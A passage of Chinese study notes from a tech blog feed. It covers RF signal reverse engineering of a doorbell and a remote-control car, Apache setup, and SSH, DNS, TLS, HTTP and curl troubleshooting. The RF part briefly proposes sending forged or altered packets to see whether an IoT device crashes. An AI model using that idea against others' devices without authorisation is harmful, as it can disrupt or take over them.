src="https://i.imgur.com/sQIJs7D.jpg"></p></li><li><p>元件溝通</p><ul><li><p>發射機<br>  <img src="https://i.imgur.com/DrcyGdD.jpg"></p></li><li><p>接收機</p></li></ul></li></ul><h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>流程:</p><ol><li>Find the signal</li><li>Capture the signal</li><li>Analyze the signal</li></ol><h4 id="Analyze-the-signal"><a href="#Analyze-the-signal" class="headerlink" title="Analyze the signal:"></a>Analyze the signal:</h4><ul><li>前導碼(Preamble):告訴雙方要準備連線了<ul><li>常見的的:0xaaaa, 0x5555</li></ul></li><li>同步碼(Sync Word):我現在開始要傳資料了喔!<ul><li>堂見的:0xd391</li></ul></li></ul><p><img src="https://i.imgur.com/naYlFWK.png"></p><p><img src="https://i.imgur.com/LzH7Dfk.png"></p><blockquote><p>FFT size:調整頻率軸縮放<br>Zoom:調整時間<br>Power Max:調整訊號顯示<br>Power Min:調整背景噪音顯示<br>調整Zoom &amp; FFT size<br><img src="https://i.imgur.com/COKLijI.jpg"></p></blockquote><p><img src="https://i.imgur.com/GEQlM5t.png"><br>讓紅線貼近訊號<br><img src="https://i.imgur.com/MNNMpqH.png"></p><p>可以看見下方的振幅(綠色的線)<br><img src="https://i.imgur.com/aEW6fvE.jpg"></p><h4 id="urh-訊號分析"><a href="#urh-訊號分析" class="headerlink" title="urh 訊號分析"></a>urh 訊號分析</h4><p><img src="https://i.imgur.com/cmzuK6s.png"><br>analysis<br><img src="https://i.imgur.com/aGQYkkS.png"></p><h3 id="分析練習"><a href="#分析練習" class="headerlink" title="分析練習"></a>分析練習</h3><h4 id="Doorball練習"><a href="#Doorball練習" class="headerlink" title="Doorball練習"></a>Doorball練習</h4><p>frequency 240~960MHz</p><p>modulation OOK(One of Key 是ASK的一種) or ASK</p><p>preamble size 0<br>preamble 0x55 or 0xaa</p><p>Sync size 32bits<br>Sync Word 0x80000000</p><p>Packet Structure:<br>Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8</p><p>了解封包結構以後，接下來就是可以去模擬一個類似的packet structure回傳給IOT裝置，如果原先的訊號沒有過濾需要的值，也就是說在Data的部分更改長度or更改內容，IOT會不會爆掉</p><p>PWM</p><ul><li>高高低1</li><li>高低低0</li><li>PWM 逼碼常與ASK進行調變</li><li>bit rate&#x3D; baud rate &#x2F; 3 &#x3D; symbol rate &#x2F; 3<br>Manchester慢測試</li><li>高電壓到低電壓是0</li><li>低電壓到高電壓是1</li><li>bit rate &#x3D; baud rate &#x2F; 2 &#x3D; symbol &#x2F;2</li></ul><h4 id="Unknow練習"><a href="#Unknow練習" class="headerlink" title="Unknow練習"></a>Unknow練習</h4><ul><li><p>Identify Application</p><ul><li>remote controlled car application</li></ul></li><li><p>Identify Modulation Type</p><ul><li>ASK&#x2F;OOK</li></ul></li><li><p>Identify Preamble</p><ul><li>No</li></ul></li><li><p>Identify Sync Word</p><ul><li>4*W2 or W2都行</li></ul></li><li><p>Identify Encoding</p><ul><li>NRZ (常與ASK做調變 but this case 例外)</li></ul></li><li><p>Identify 4 Signal Function</p><ul><li><img src="https://i.imgur.com/cZLi4qY.png"></li><li>上 w2x4 + w1x10</li><li>下 w2x4 + w1x40</li><li>右 w2x4 + w1x64</li><li>左 w2x4 + w1x58</li></ul></li><li><p>Identify Packet Structure<br><img src="https://i.imgur.com/3oTSfia.png"><br><img src="https://i.imgur.com/GokBAQ8.png"></p></li></ul><h2 id="apache2-server"><a href="#apache2-server" class="headerlink" title="apache2 server"></a>apache2 server</h2><p><strong>Reference</strong><br><a href="https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache">https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache</a><br><a href="https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/">https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/</a></p><ul><li>install<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></li><li>start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure></li><li>restart<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li><li>stop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑 DMS_Troubleshooting 筆記</title>
      <link href="/posts/5728fae1.html"/>
      <url>/posts/5728fae1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Network-Debug"><a href="#Network-Debug" class="headerlink" title="Network Debug"></a>Network Debug</h2><ul><li>若你SSH不到Server，你會怎麼做?<ul><li>先Ping Server看通不通</li><li>若還是錯誤則是根據SSH連線出現的錯誤訊息來做故障排除</li><li><strong>Unable to open connection to example.com Host does not exist</strong><ul><li>檢查是否可透過 <code>ping</code> 來去解析目標server域名</li><li>若使用hostname則改用ip試試看(交替試試看)</li></ul></li><li><strong>Connection timed out</strong>: client試圖與SSH Server建立network socket，但server在時間內沒能回應<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接<ul><li><code>$ netstat -all</code></li></ul></li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li><code>$ iptables --list</code></li><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li></ul></li></ul></li><li><strong>Connection Refused</strong>: 請求正在路由到host，但host沒能接收到請求<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接</li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li><li>檢查服務當前是否正在運行並綁定到預期port上</li></ul></li></ul></li><li>如何檢查防火牆?<ul><li><code>iptable -nL</code></li><li><code>ufw status</code></li></ul></li><li>檢查SSH狀態<ul><li>舊版本的OS可以使用 <code>service</code><ul><li><code>service ssh status</code></li><li>若結果有正確顯示process id則代表正確運行</li><li>若沒有運行則會顯示，ssh stop&#x2F;waiting 之類的訊息</li><li>可透過 <code>service ssh start</code> 開啟服務</li></ul></li><li>新版本的OS可以使用 <code>systemctl</code><ul><li><code>systemctl status sshd</code></li><li>若正確運行，則會顯示active或running</li><li>若沒再運行則會顯示inactive</li><li>可透過 <code>systemctl start sshd</code>來開啟服務</li></ul></li></ul></li><li>檢查SSH Service Port<ul><li>有兩種方式檢查SSH是跑在哪個port上<ul><li>第一個是去查看 ssh 設定檔<ul><li><code>grep Port /etc/ssh/sshd_config</code></li></ul></li><li>若你知道ssh服務正在運行，則可透過 <code>ss</code>指令查看是否跑在預期的port上<ul><li><code>ss -plnt</code> &#x2F;&#x2F;是從kernel中query出socket資訊</li><li><code>netstat -plnt</code></li></ul></li></ul></li></ul></li></ul></li><li>導致SSH連線失敗的原因可能會有哪些?<ul><li><strong>ssh公鑰沒有被inject到Server上</strong><ul><li>我們在本地端產生ssh key pair，並可能透過passphase保護私鑰</li><li>將ssh公鑰注入到遠端server上的 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong> 路徑</li><li>而有時候常會跳出 <strong>Permission denied (publickey)</strong> 的錯誤訊息<ul><li>原因一: 該私鑰沒有權限登入</li><li>原因二: 公鑰沒有正確被放入路徑或公鑰遺失</li><li>原因三: 本地 ssh 公鑰和私鑰未正確配對</li><li>在連接之前，ssh 會檢查我們的公鑰和私鑰是否正確配對</li></ul></li><li>預設路徑<ul><li><code>$ ssh-keygen</code></li><li>公鑰預設放在 <code>/home/username/.ssh/id_rsa.pub</code></li><li>私鑰預設放在 <code>/home/username/.ssh/id_rsa</code></li></ul></li><li>要如何將公鑰注入至Server路徑中? <ul><li><code>ssh-copy-id USER@HOST</code></li><li>預設就是放入 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong></li></ul></li></ul></li><li><strong>防火牆導致無法連線</strong><ul><li>檢查Policy</li></ul></li><li><strong>Host Key Check Fails</strong><br>  <img src="https://i.imgur.com/XSDQF9V.png"><br>  出現類似這種錯誤訊息<br>  每個Server都會有Fingerprint，不同server或server重新配置則fingerprint則不同<br>  當成功登入，則電腦會保存fingerprint來為下一次連接做比較，若fingerprint不匹配則會跳出這種警告<ul><li>如果確定有重新設定server則可以忽略這個警告</li><li>可以在 <strong>~&#x2F;.ssh&#x2F;known_hosts</strong> 刪除entry，或清空文件，這將會關閉所有密鑰檢查</li></ul></li><li><strong>Your SSH Key File Mode Issues</strong><ul><li>作為保護 SSH Key檔案的權限應該要是0600(Owner R+W)或0400(Owner R)<br>  <img src="https://i.imgur.com/F9O86LG.png"></li></ul></li></ul></li><li>SSH中要如何啟用無密碼認證?<ul><li>至<code>/etc/ssh/sshd_config</code> 中修改設定  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure></li></ul></li><li>講解一下Ping跟Tracert指令是怎麼運作的?<br>  <img src="https://i.imgur.com/Kog8FV8.png"><ul><li>Ping: 向特定目標發送ICMP Echo Request以確認對目的端的通訊狀態<ul><li>可以根據ping返回的TTL值來判斷對方所使用的操作系統及數據包經過路由器數量</li></ul></li><li>Tracert: 善用回應逾時的錯誤以查詢到目的地的路徑</li></ul></li><li><a href="https://www.361way.com/linux-mtu-jumbo-frames/4055.html">Linux底下要怎麼修改MTU值?</a></li><li>甚麼是Jumbo Frame?<ul><li>為比標準Ethernet Frame還大的Frame，比1518&#x2F;1522 bit大的frame</li><li>只能在full-duplex的乙太網路中運行</li><li>標準Ethernet IP訊息大小是: 1500Bit，若包含Ethernet Header以及FCS(6+6+2+4)是1518bit</li><li>Jumbo frame指的是兩層封裝三層IP Message的值大於9000bit的Message</li><li>若使用一般1500Bit的frame，frame越小，傳輸封包量越大，計算量越多，則:<ul><li>增加Host的計算量，消耗CPU資源</li><li>影響網路傳輸速度</li><li>所以加大frame可以降低CPU計算量並加快傳輸速度</li></ul></li></ul></li><li>如何修改frame大小(如何創造Jumbo Frame?)<ul><li>修改MTU(Maximum Transmission Unit)值 </li><li><ol><li><code>ifconfig $&#123;Interface&#125; mtu $&#123;SIZE&#125; up</code></li></ol></li><li>ex. <code>ifconfig eth1 mtu 9000 up</code></li><li>但這樣重啟需要重新設定</li><li><ol start="2"><li>修改config檔案</li></ol></li><li>Ubuntu&#x2F;Debian底下是在 &#x2F;etc&#x2F;network&#x2F;interfaces底下</li><li>新增 <code>mtu 9000</code></li><li>重啟服務 <code>/etc/init.d/network-manager restart</code></li><li><strong>經過交換網路設定時，僅修改Host端的MTU值不太行，還續鑰檢查網路設備有無啟用jumbo frames功能</strong></li></ul></li><li>測試MTU<ul><li><code>ping -l 9000 -f &lt;domain&gt;</code></li><li>-f 參數告訴作業系統不能私自更改封包大小</li></ul></li><li>講解一下Email的通訊原理<ul><li>當輸入Email時，”@”後面即為Domain Name<blockquote><p><a href="http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns">http://linux.vbird.org/linux_server/0380mail.php#whatmail_dns</a><br><a href="https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/">https://weils.net/blog/2017/04/19/how-email-works-dkim-all-in-one/</a><br><a href="https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/">https://docs.digitalocean.com/support/how-to-troubleshoot-ssh-connectivity-issues/</a><br><a href="https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/">https://www.linux.com/topic/networking/4-reasons-why-ssh-connection-fails/</a><br><a href="https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console">https://help.skysilk.com/support/solutions/articles/9000150151-how-to-troubleshoot-ssh-connection-issues-using-vnc-console</a></p></blockquote></li></ul></li><li>DNS設定失敗會怎麼解決?<blockquote><p><a href="https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns">https://www.digitalocean.com/community/tutorial_series/an-introduction-to-managing-dns</a> </p></blockquote></li><li>可以講解一下HTTP協定運作原理嗎?<br>  <img src="https://i.imgur.com/kwU3Ay7.png"><ul><li>通常由使用者透過瀏覽器或爬蟲來對Server端發出請求</li><li>那其中我們會稱這個client為User Agent，一個代理程式</li><li>而請求的Server上可能也會有一些像是HTML檔案或圖像之類的資源</li><li>當HTTP Client發出請求，建立一個到Server端指定port(預設是80)的TCP連線</li><li>則HTTP Server則會在那個port監聽client的請求</li><li>一旦收到請求，Server會向Client返回一個狀態 ex. “HTTP&#x2F;1.1 200 OK”，以及返回內容或錯誤訊息等等資訊</li><li>HTTP在1.1中加入了保持連線的機制，一個連接可以重複在多個請求&#x2F;回應使用</li><li>可以減少等待時間</li></ul></li><li>那HTTPS呢?<ul><li>就是在進行HTTP連線之前會先進行TLS&#x2F;SSL Handshake</li></ul></li><li>你知道的HTTP狀態碼有哪些?<ul><li>2xx<br>  <img src="https://i.imgur.com/KWTpmAh.png"></li><li>3xx<br>  <img src="https://i.imgur.com/zShTVKk.png"></li><li>400 - Bad Request : 代表送到Server的HTTP Request語法有誤或無效<ul><li>檢查: </li><li><ol><li>URL中的錯誤</li></ol></li><li><ol start="2"><li>與該網站的cookie可能毀損，清除瀏覽器的cookie以及cache</li></ol></li><li><ol start="3"><li>嘗試在不同的web瀏覽器上打開相同的網頁</li></ol></li></ul></li><li>401 - Unauthorized: 代表使用者在未經身分認證的情況下嘗試存取資源，而用戶必須提供credential才可以查看受保護的資源<ul><li>檢查:</li><li><ol><li>檢查URL錯誤，若URL有效，則存取主頁並登入，輸入資訊，然後重試</li></ol></li><li><ol start="2"><li>瀏覽器也可能快取到無效資訊，因此可以清除快取</li></ol></li></ul></li><li>403 - Forbidden: 發生在用戶發出有效請求但Server由於缺乏存取資源的權限而拒絕服務時<ul><li>檢查: </li><li><ol><li>確保Server中 &#x2F;www 資料的存取權限是正確的</li></ol></li><li><ol start="2"><li>檢查 .htaccess 設定(.htaccess 文件控制對資源的存取)</li></ol></li><li><ol start="3"><li>若網站沒有index文件，也有可能發生這種情況，這樣須將主頁重新命名為index.html&#x2F;index.php</li></ol></li><li><ol start="3"><li>與網站管理員聯繫已取得存取權限 (應將權限設為讀取)</li></ol></li><li><ol start="4"><li>若其他用戶可以存取，則需要聯絡ISP來解決這個問題</li></ol></li></ul></li><li>404 - Not Found: 代表用戶可與Server通訊，但無法定位所請求的資源<ul><li>檢查:</li><li><ol><li>一樣URL有沒有錯</li></ol></li><li><ol start="2"><li>F5更新網頁</li></ol></li><li><ol start="3"><li>清除瀏覽器快取</li></ol></li><li><ol start="4"><li>修改DNS Server設定</li></ol></li></ul></li><li>500 - Internal Server Error: 這代表網站Server出現問題，Server無法偵測確切問題，但client端還是能夠嘗試以下步驟<ul><li>檢查:</li><li><ol><li>網路流量高，按下F5，重新載入網頁</li></ol></li><li><ol start="2"><li>清除網路瀏覽器快取和cookie</li></ol></li><li><ol start="3"><li>檢查網站的 .htaccess文件被正確建立</li></ol></li><li><ol start="4"><li>檢查文件和資料夾是否有任何不正確的權限</li></ol></li></ul></li><li>502 - Bad Gateway: 代表Server充當gateway或proxy，無法從上游Server獲得有效的Response，這也有可能是由於DNS問題所造成的<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>關閉所有打開的瀏覽器並啟動新的瀏覽器Session</li></ol></li><li><ol start="3"><li>清空瀏覽器快取</li></ol></li><li><ol start="4"><li>暫時禁用CDN(Content Delivery Network)</li></ol></li><li><ol start="5"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>503 - Service Unavailable: 這代表server負載過大，或正在維護中<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li></ul></li><li>504 - Gateway Timeout: 代表Server是Gateway或proxy，在允許的時間內無法從後端server獲得response<ul><li>檢查:</li><li><ol><li>F5鍵，重新載入網頁</li></ol></li><li><ol start="2"><li>重啟網路設備(modem, router etc.)</li></ol></li><li><ol start="3"><li>變更DNS Server(若你網路中的所有設備都收到相同錯誤)</li></ol></li><li><ol start="4"><li>仍然有錯誤可能要聯絡網管或ISP</li></ol></li></ul></li></ul></li><li>可以講解一下SMTP運作原理嗎?</li><li>可以講解一下DNS的運作原理?<ul><li>有分成兩種，一種是授權型DNS另一種是遞迴型server</li><li>授權型會接收並回應DNS查詢服務，一層一層找到root DNS Server</li><li>遞迴型則本身沒有DNS Record，但它會將請求傳遞給授權DNS Server去取得IP位址</li><li>運作流程:<ul><li>當輸入<a href="http://www.ntust,edu.tw/">www.ntust,edu.tw</a> 時，DNS Server會接收到查詢IP位址的請求</li><li>DNS Server會開始查詢<a href="http://www.example.com/">www.example.com</a> 的IP位址</li><li>並檢查local DNS Server的Cache中有沒有dns record<ul><li>會去 <code>/etc/resolv.conf</code> 查找，將網域變更為FQDN</li></ul></li><li>若沒有則會去root DNS Server去查找</li><li>root DNS Server會去告知DNS Server 「管理tw的DNS Server」的IP地址</li><li>而local DNS Server取得該IP後就會去發出DNS請求<ul><li><code>dig tw ns +short</code></li></ul></li><li>而管理tw的DNS Server會去告訴local DNS Server 「管理 edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver edu.tw ns</code></li><li><code>dig @a.dns.tw edu.tw ns +short</code></li></ul></li><li>而local DNS Server取得該IP後就會去發出DNS請求</li><li>管理edu.tw的DNS Server會去告訴local DNS Server 「管理ntust.edu.tw的DNS Server」的IP位址<ul><li><code>dig @nameserver ntust.edu.tw ns +short</code></li></ul></li><li>接著local DNS Server就會去對該IP位址發出請求<ul><li><code>dig @RealAuthorieServer ntust.edu.tw a +short</code></li></ul></li><li>則管理ntust.edu.tw的DNS Server會返回<a href="http://www.ntust.edu.tw的ip位址/">www.ntust.edu.tw的IP位址</a></li></ul></li></ul></li><li>可以講解一下TLS&#x2F;SSL Handeshake的過程嗎?<br>  <a href="https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/">https://www.cloudflare.com/zh-tw/learning/ssl/what-happens-in-a-tls-handshake/</a><br>  <img src="https://i.imgur.com/4EOqjes.png"><br>  運作在Session Layer，主要會在通訊雙方交換資訊並互相驗證，並透過他們所使用的通訊加密演算法並產生一致的工作金鑰<ul><li>TLS 握手什麼時候發生？<ul><li>用戶導航到一個使用 HTTPS 的網站，瀏覽器首先開始查詢網站的原始伺服器，這時就會發生 TLS 握手。</li><li>在任何其他通信使用HTTPS時（包括 API 調用和 DNS over HTTPS 查詢），也會發生 TLS 握手。</li><li>通過 TCP Handshake 打開 TCP 連接後，將發生 TLS Handshake</li></ul></li><li>TLS Handshake過程中發生啥事?<ul><li>client與server之間會進行以下操作:<ul><li>指定TLS版本(TLS 1.0、1.2、1.3)</li><li>決定所使用的密碼學套件</li><li>透過Server的公開密鑰和SSL憑證頒發機構的電子簽章去驗證Server的身分</li><li>生成工作階段金鑰，以便在握手完成後使用對稱加密</li></ul></li></ul></li><li>TLS Handshake的步驟是甚麼?<ul><li>具體步驟會隨著使用的金鑰交換演算法的不同而不同</li><li>最常用的是<strong>RSA</strong>金鑰交換演算法<ul><li><strong>Client Hello:</strong><ul><li>client對server發出hello消息來進行Handshake，其中包含了用戶端支援的TLS版本，支援的密碼套件、以及一個client隨機亂數</li></ul></li><li><strong>Server Hello:</strong><ul><li>回覆client hello，server回傳訊息中包含:</li><li>SSL憑證 <code>這是哪來的?怎麼產生的?</code></li><li>伺服器選擇的密碼套件</li><li>server隨機亂數</li></ul></li><li><strong>身分認證</strong><ul><li>client端使用頒發該憑證的憑證授權驗證伺服器的 SSL 憑證</li><li>此舉確認Server是其聲稱的身份，且client正在與該domain的實際所有者進行互動</li></ul></li><li><strong>premaster secret</strong><ul><li>client端再發送一串隨機位元組，即premaster secret</li><li>premaster secret使用公開金鑰加密(是client從SSL憑證中取得公鑰，來進行加密的)</li><li>只能使用server的secret key進行解密</li></ul></li><li><strong>secret key被使用</strong><ul><li>server透過私鑰對premaster secret進行解密</li></ul></li><li><strong>生成工作階段金鑰</strong><ul><li>client 與 server端均使用client亂數、server亂數和premaster secret去生成工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li><li>所有 TLS 握手都使用非對稱加密（公開金鑰和私密金鑰），但並不是所有的 TLS 握手都會在生成工作階段密鑰的過程中使用私密金鑰。例如，臨時 <strong>Diffie-Hellman</strong> 握手的步驟如下：<ul><li><strong>Client Hello</strong><ul><li>包含協定版本、client亂數、密碼學套件清單</li></ul></li><li><strong>Server Hello</strong><ul><li>包含SSL憑證、選定的密碼套件、Server亂數</li></ul></li><li><strong>server的數位簽章</strong><ul><li>server使用其私鑰對client亂數、server亂數以及DH參數進行加密</li><li>加密後的資料用作伺服器的數位簽章</li><li>已確定Server中具有與SSL憑證中的公鑰匹配的私鑰</li></ul></li><li><strong>Server與Client計算premaster secret</strong><ul><li>client與server使用交換的DH參數分別計算匹配的premaster secret</li><li>而不像RSA Handshake那樣由用戶端生成premaster secret並將其發送到server</li></ul></li><li><strong>建立工作階段金鑰</strong><ul><li>client與server從premaster secret、client亂數、server亂數中計算工作階段金鑰</li></ul></li><li><strong>client就緒</strong><ul><li>client會發送一條<strong>已完成</strong>的消息</li></ul></li><li><strong>server就緒</strong> <ul><li>server會發送一條<strong>已完成</strong>的消息</li></ul></li></ul></li></ul></li></ul></li><li><a href="https://segmentfault.com/a/1190000021778053">TLS Handshake失敗可能原因會是甚麼?</a><ul><li>常見錯誤訊息:<code>SSL Handshake Failed error</code></li><li>常見錯誤原因:<ul><li>協定不匹配  <code>server端出錯</code></li><li>加密套件不匹配 <code>server端出錯</code> → Server端不支援client請求使用的加密套件</li><li>系統時間不準確 (可是剛剛過程沒用到時間資訊阿:|)</li><li>瀏覽器設定錯誤</li><li>憑證錯誤 <code>server端出錯</code><ul><li>憑證中的domain name與URL中的domain name不符</li><li>憑證過期</li><li>或憑證鏈出錯</li><li>使用自簽名的憑證</li></ul></li><li>Server啟用了SNI-Enabled <code>server端出錯</code></li></ul></li><li><strong>協定不匹配</strong><ul><li>透過 <code>tcpdump -i any -s 0 host IP address -w File name</code> 在client或server上蒐集資訊</li><li>透過wireshark去分析蒐集的packet</li><li>去找<strong>client hello</strong>所使用的TLS版本</li><li>去看Sever端之後後續處理的錯誤資訊</li><li><a href="https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures">https://docs.apigee.com/api-platform/troubleshoot/runtime/ssl-handshake-failures</a></li></ul></li></ul></li><li>網站憑證過期該怎麼辦?<ul><li>去更新憑證</li></ul></li><li>可以講解一下甚麼是SSL嗎?<ul><li>全名是Secure Soekcts Layers，用來確保兩個系統之間所傳遞的敏感資料被竄改或讀取</li><li>TLS就是更安全的SSL版本</li></ul></li></ul><h2 id="Linux-Admin"><a href="#Linux-Admin" class="headerlink" title="Linux Admin"></a>Linux Admin</h2><blockquote><p>感覺偏向指令使用或config如何設定</p></blockquote><ul><li>在Linux中你會怎麼管理User跟Group?那在Windows中你又會怎麼做管理?<ul><li>看user<code>cat /etc/passwd</code></li><li>新增user <code>useradd</code></li><li>新增group <code>groupadd</code></li><li>再透過 <code>gpasswd</code> 將使用者加入或移除 root (sudo) 權限群組</li></ul></li><li>可以講解一下<code>curl</code> 指令的原理嗎?<ul><li>一個command line工具可以傳遞資料到server中</li></ul></li><li>你會怎麼使用 <code>curl</code> 這個指令來做Troubleshooting?<ul><li><code>$ curl protocol://IP/host:port</code></li><li>Troubleshooting Web Servers<ul><li><code>curl http://example.com -I</code> 透過-I參數來返回Header</li></ul></li><li>Troubleshooting SMTP Servers <ul><li><code>curl smtp://example.com</code> 預設使用 port 25 作為SMTP Port</li><li>但某些ISP會阻擋標準SMTP port來防止SPAM</li><li>亦可使用 2525 或 587 port</li></ul></li><li>Troubleshooting FTP<ul><li><code>curl ftp://example.com</code> 預設使用21 port</li></ul></li></ul></li><li>如何使用 <code>curl</code> 指令並透過proxy來連接?<ul><li><code>curl --proxy yourproxy:port https://yoururl.com</code></li></ul></li><li>如何透過 <code>curl</code> 略過檢查自簽SSL憑證的有效性?<ul><li><code>curl -k https://localhost/</code></li><li><code>curl --insecure https://localhost/</code></li></ul></li><li>curl 各種用法:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl [protocol://domain:port/]</span><br><span class="line">$ curl -o &lt;欲下載的檔名&gt; [protocol://domain:port/] 下載特定檔案</span><br><span class="line">$ curl -O [protocol://domain:port/file]  直接下載網址中的檔案</span><br><span class="line">$ curl -C - -O [protocol://domain:port/file] 從剛剛被中斷的地方繼續下載</span><br><span class="line">$ curl -L [protocol://domain:port/] 跟隨網址的301/302 redirect</span><br><span class="line">$ curl --trace-ascii debugdump.txt [protocol://domain:port/] 追蹤整個curl過程，並將結果存入debugdump.txt檔案</span><br></pre></td></tr></table></figure></li><li>curl 進行HTTP Request<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|PATCH]  使用指定的 http method 來發出 http request</span><br><span class="line">-H/--header                           設定 request 裡所攜帶的 header</span><br><span class="line">-i/--include                          在 output 顯示 response 的 header</span><br><span class="line">-d/--data                             攜帶 HTTP POST Data </span><br><span class="line">-v/--verbose                          輸出更多的訊息方便 debug</span><br><span class="line">-u/--user                             攜帶使用者帳號、密碼</span><br><span class="line">-b/--cookie                           攜帶 cookie（可以是參數或是檔案位置）</span><br></pre></td></tr></table></figure></li><li>透過 curl去POST資料到 HTML Form<ul><li>假設收到的Form表單的HTML長這樣  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;</span><br><span class="line">   &lt;input type=text name=&quot;email&quot;&gt;</span><br><span class="line">   &lt;input type=submit name=press value=&quot; OK &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot; http://www.example.com/form.php</code></li></ul></li><li>透過 curl去進行檔案上傳<ul><li>假設收到的Form表單的HTML是  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt;</span><br><span class="line">&lt;input type=file name=upload&gt;</span><br><span class="line">&lt;input type=submit name=press value=&quot;OK&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST -F &#39;file=@./upload.txt&#39; http://www.example.com/upload.php</code></li></ul></li><li>透過curl常見的RESTFul CRUD指令:<ul><li>GET單一或全部資源  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources&quot;</span><br><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li><li>POST JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false,&quot;name&quot;:&quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>PUT JSON資料  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>DELETE 資源   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>透過curl攜帶cookie</strong><ul><li>在指令中輸入cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;name=Jack&quot; http://www.example.com</span><br></pre></td></tr></table></figure></li><li>從檔案中讀取cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 